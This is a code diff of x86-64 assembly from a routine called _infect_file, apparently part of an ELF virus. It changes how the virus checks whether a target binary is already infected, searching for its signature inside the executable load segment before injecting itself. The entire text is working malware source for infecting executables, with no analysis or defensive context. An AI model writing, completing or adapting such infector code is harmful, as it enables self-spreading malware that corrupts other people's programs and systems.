@@ -315,27 +315,9 @@ _infect_file: ; (string rdi, stat rsi)
 	jne .unmap
 
 	.is_elf_file:
-		cmp byte[rsi + 4], 2 ; ELFCLASS64
-		je .check_if_infected
-		cmp byte[rsi + 4], 1 ; ELFCLASS32
-		je .unmap
-
 		; TODO: do 32 bits version (new compilation ?)
-		.check_if_infected:
-			lea rdi, [rel signature]
-			%ifdef DEBUG
-				call _print; _print(rdi)
-			%endif
-			call _ft_strlen
-			push rax
-			pop rcx
-			push rdi
-			pop rdx
-			mov rdi, r13
-			mov rsi, [r12 + 48]
-			call _ft_memmem
-			cmp rax, 0x0
-			jne .unmap
+		cmp byte[rsi + 4], 2 ; ELFCLASS64
+		jne .unmap
 
 		; get pt_load exec
 		mov rsi, [r13 + 32]; e_phoff
@@ -353,11 +335,31 @@ _infect_file: ; (string rdi, stat rsi)
 			xor rdx, rdx
 			mov dx, [rdi + 4]; p_flags
 			and dx, 1 ; PF_X
-			jnz .segment_found
+			jnz .check_if_infected
 			.next:
 				add rdi, 56; sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
-		.segment_found:
+		.check_if_infected:
+			push rdi
+			lea rdi, [rel signature]
+			%ifdef DEBUG
+				call _print; _print(rdi)
+			%endif
+			call _ft_strlen
+			push rax
+			pop rcx
+			push rdi
+			pop rdx
+			pop rbx
+			mov rdi, r13
+			add rdi, [rbx + 8]; p_offset
+			mov rsi, [rbx + 32]; p_filesz
+			call _ft_memmem
+			push rbx
+			pop rdi
+			cmp rax, 0x0
+			jne .unmap
+
 			mov rax, [rdi + 8]; p_offset
 			add rax, [rdi + 32]; p_filesz
 			mov rsi, [rdi + 56 + 8] ; next->p_offset
